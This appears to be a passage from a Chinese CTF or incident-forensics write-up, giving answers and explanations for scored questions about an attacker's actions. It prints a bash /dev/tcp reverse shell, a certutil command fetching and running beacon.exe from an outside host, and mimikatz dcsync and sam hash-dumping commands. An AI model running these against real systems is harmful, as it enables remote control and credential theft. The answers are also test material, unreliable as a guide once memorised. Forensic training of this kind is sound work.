  1. 使用 exec 命令将文件描述符 5 关联到 /dev/tcp/172.16.0.144/8888，即与 IP 地址为 172.16.0.144、端口为 8888 的远程主机建立 TCP 连接。这种技术通常被称为 Bash 的 I/O 重定向。
  2. 使用 cat <&5 命令从文件描述符 5（即与远程主机的连接）读取数据。
  3. 使用 while read line; do $line 2>&5 >&5; done 命令，读取从远程主机发送过来的每一行数据，并执行它们。这里的 2>&5 表示将标准错误重定向到文件描述符 5，>&5 表示将标准输出重定向到文件描述符 5，从而可以将命令的输出和错误发送回远程主机。

41、黑客通过代码服务中上传的远控木马文件是？（150分）

答案：test1.exe

  • cmd.exe /c: 这是在 Windows 系统上运行命令提示符 (cmd.exe) 的方式。/c 标志告诉命令提示符在执行命令后终止。
  • certutil: 这是一个 Windows 命令行工具，用于管理证书，但是在这里使用它来下载文件。
  • -urlcache -split -f http://172.16.0.144:11111/beacon.exe: 这是 certutil 的参数，它告诉 certutil 从指定的 URL (http://172.16.0.144:11111/beacon.exe) 下载文件。-split 标志告诉它将文件下载到临时目录并拆分成片段，-f 标志强制覆盖现有文件（如果存在）。
  • .\\\\test1.exe: 这部分是 certutil 下载的文件保存的路径。\\\\ 是 Windows 上路径中的转义符，用于表示反斜杠。所以这里的路径是 .\test1.exe，意味着文件将被保存在当前目录下，并命名为 test1.exe。
  • &&: 这是命令提示符中的逻辑运算符，用于在前一个命令成功执行后执行下一个命令。
  • .\\\\test1.exe: 这部分是要执行的文件路径。它会运行之前下载的 test1.exe 文件。

因此，整个命令的作用是下载 beacon.exe 文件并保存为 test1.exe，然后执行 test1.exe 文件。

因此上传后的木马为test1.exe

55、接上题，黑客接着使用了______参数来执行从指定的域控服务器中提取域用户的哈希。（300分）(标准格式:abc::abc)

答案：lsadump::dcsync

参考资料

Lsadump模块（读取域控中域成员的Hash）

lsadump::lsa /patch

读取所有与用户的哈希

lsadump::dcsync

通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取

查看域内指定用户信息，包括NTLM哈希等

lsadump::dcsync /domain:nanhu.com /user:nanhu

查看所有域用户

lsadump::dcsync /domain:nanhu.com /all /csv

lsadump::sam

sam表获取Hash
